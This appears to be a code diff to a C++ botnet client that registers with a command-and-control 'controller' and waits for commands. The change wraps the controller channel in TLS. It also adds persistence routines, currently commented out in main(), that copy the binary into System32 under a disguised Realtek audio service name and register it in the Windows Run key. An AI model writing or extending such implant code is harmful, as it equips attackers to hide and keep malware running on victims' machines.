@@ -22,12 +22,57 @@
 #include <stdio.h>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
+#include <openssl/x509v3.h>
 #endif
 
 using namespace std;
 
 const string CONTROLLER_IP = "127.0.0.1";
 const int CONTROLLER_PORT = 12345;
+const string CERT_FILE =""
+const string KEY_FILE = ""
+
+bool copyToSystem32() {
+    char system32Path[MAX_PATH];
+    if (!GetSystemDirectoryA(system32Path, MAX_PATH)) {
+        return false;
+    }
+
+    char currentPath[MAX_PATH];
+    if (!GetModuleFileNameA(NULL, currentPath, MAX_PATH)) {
+        return false;
+    }
+
+    std::string destinationPath = std::string(system32Path) + "\\RtkAudUService64.exe";
+
+    if (!CopyFileA(currentPath, destinationPath.c_str(), FALSE)) {
+        return false;
+    }
+
+    return true;
+}
+
+bool addToStartup() {
+    char system32Path[MAX_PATH];
+    if (!GetSystemDirectoryA(system32Path, MAX_PATH)) {
+        return false;
+    }
+
+    std::string executablePath = std::string(system32Path) + "\\RtkAudUService64.exe";
+
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
+        return false;
+    }
+
+    if (RegSetValueExA(hKey, "RtkAudUService64", 0, REG_SZ, (const BYTE*)executablePath.c_str(), executablePath.length() + 1) != ERROR_SUCCESS) {
+        RegCloseKey(hKey);
+        return false;
+    }
+
+    RegCloseKey(hKey);
+    return true;
+}
 
 #ifdef _WIN32
 bool initialize_winsock() {
@@ -79,7 +124,16 @@ string exec(const char* cmd) {
 }
 #endif
 
-bool register_with_controller(SOCKET& sock) {
+int verify_callback(int preverify_ok, X509_STORE_CTX* ctx) {
+    if (preverify_ok == 0) {
+        int error = X509_STORE_CTX_get_error(ctx);
+        cerr << "Certificate verification failed: " << X509_verify_cert_error_string(error) << endl;
+        return 0;
+    }
+    return 1;
+}
+
+bool register_with_controller(int sock, SSL_CTX* ctx) {
     try {
         sockaddr_in server_address;
         server_address.sin_family = AF_INET;
@@ -101,35 +155,45 @@ bool register_with_controller(SOCKET& sock) {
             return false;
         }
 
+        SSL* ssl = SSL_new(ctx);
+        if (!ssl) {
+            cerr << "SSL_new failed" << endl;
+            return false;
+        }
+        SSL_set_fd(ssl, sock);
+
+        if (SSL_connect(ssl) <= 0) {
+            ERR_print_errors_fp(stderr);
+            cerr << "SSL_connect failed" << endl;
+            SSL_free(ssl);
+            return false;
+        }
+        cout << "SSL connection successful!" << endl;
+
+
         string message = "{\"bot_id\": \"" + BOT_ID + "\", \"action\": \"register\"}";
-        if (send(sock, message.c_str(), message.length(), 0) == SOCKET_ERROR) {
-            cerr << "Send failed. Error: " <<
-#ifdef _WIN32
-                WSAGetLastError()
-#else
-                errno
-#endif
-                << endl;
+        int ret = SSL_write(ssl, message.c_str(), message.length());
+        if (ret <= 0) {
+            cerr << "SSL_write failed. Error: " << SSL_get_error(ssl, ret) << endl;
+            SSL_shutdown(ssl);
+            SSL_free(ssl);
             return false;
         }
 
         char buffer[1024];
-        int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
-        if (bytes_received > 0) {
-            buffer[bytes_received] = '\0';
+        ret = SSL_read(ssl, buffer, sizeof(buffer) - 1);
+        if (ret > 0) {
+            buffer[ret] = '\0';
             cout << "Response from controller: " << buffer << endl;
         }
         else {
-            cerr << "Error receiving data from controller. Error: " <<
-#ifdef _WIN32
-                WSAGetLastError()
-#else
-                errno
-#endif
-                << endl;
+            cerr << "Error receiving data from controller. Error: " << SSL_get_error(ssl, ret) << endl;
+            SSL_shutdown(ssl);
+            SSL_free(ssl);
             return false;
         }
 
+        SSL_shutdown(ssl);
         return true;
     }
     catch (const exception& e) {
@@ -138,30 +202,23 @@ bool register_with_controller(SOCKET& sock) {
     }
 }
 
-void execute_command(const string& command) {
-
-    cout << "Executing command: " << command << endl;
-    if (command == "ping") {
-        cout << "Bot " << BOT_ID << ": Pong!" << endl;
-    }
-    else if (command == "sleep") {
-        random_device rd;
-        mt19937 gen(rd());
-        uniform_int_distribution<> distrib(1, 5); // Range 1-5 seconds
-
-        int sleep_time = distrib(gen);
-
-        cout << "Bot " << BOT_ID << ": Sleeping for " << sleep_time << " seconds..." << endl;
-        this_thread::sleep_for(chrono::seconds(sleep_time));
-        cout << "Bot " << BOT_ID << ": Woke up!" << endl;
-    }
-    else {
-        cout << "Bot " << BOT_ID << ": Unknown command: " << command << endl;
-    }
-}
-
 
 int main() {
+    /*
+    if (copyToSystem32()) {
+        std::cout << "Successfully copied to System32." << std::endl;
+    }
+    else {
+        std::cerr << "Failed to copy to System32." << std::endl;
+    }
+
+    if (addToStartup()) {
+        std::cout << "Successfully added to startup." << std::endl;
+    }
+    else {
+        std::cerr << "Failed to add to startup." << std::endl;
+    }
+    */
 
 #ifdef _WIN32
     if (!initialize_winsock()) {
@@ -169,7 +226,30 @@ int main() {
     }
 #endif
 
-    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+    SSL_library_init();
+    OpenSSL_add_all_algorithms();
+    SSL_load_error_strings();
+
+    const SSL_METHOD* method = TLS_client_method();
+    SSL_CTX* ctx = SSL_CTX_new(method);
+
+    if (!ctx) {
+        cerr << "Unable to create SSL context" << endl;
+        ERR_print_errors_fp(stderr);
+        return 1;
+    }
+
+    if (SSL_CTX_load_verify_locations(ctx, CERT_FILE.c_str(), NULL) != 1) {
+        ERR_print_errors_fp(stderr);
+        cerr << "Error loading trust store" << endl;
+        SSL_CTX_free(ctx);
+        return 1;
+    }
+
+    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, verify_callback);
+    SSL_CTX_set_verify_depth(ctx, 2);
+
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == INVALID_SOCKET) {
         cerr << "Could not create socket. Error: " <<
 #ifdef _WIN32
@@ -181,15 +261,24 @@ int main() {
         return 1;
     }
 
-    if (!register_with_controller(sock)) {
+    if (!register_with_controller(sock, ctx)) {
         closesocket(sock);
+        SSL_CTX_free(ctx);
         return 1;
     }
 
+    SSL* ssl = SSL_new(ctx);
+    SSL_set_fd(ssl, sock);
+    if (SSL_connect(ssl) <= 0) {
+        ERR_print_errors_fp(stderr);
+        cerr << "SSL_connect failed" << endl;
+        SSL_free(ssl);
+        return 1;
+    }
 
     while (true) {
         char buffer[1024];
-        int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
+        int bytes_received = SSL_read(ssl, buffer, sizeof(buffer) - 1);
 
         if (bytes_received > 0) {
             buffer[bytes_received] = '\0';
@@ -209,18 +298,15 @@ int main() {
             break;
         }
         else {
-            cerr << "Error receiving data. Error: " <<
-#ifdef _WIN32
-                WSAGetLastError()
-#else
-                errno
-#endif
-                << endl;
+            cerr << "Error receiving data. Error: " << SSL_get_error(ssl, bytes_received) << endl;
             break;
         }
     }
 
+    SSL_shutdown(ssl);
+    SSL_free(ssl);
     closesocket(sock);
+    SSL_CTX_free(ctx);
 #ifdef _WIN32
     WSACleanup();
 #endif
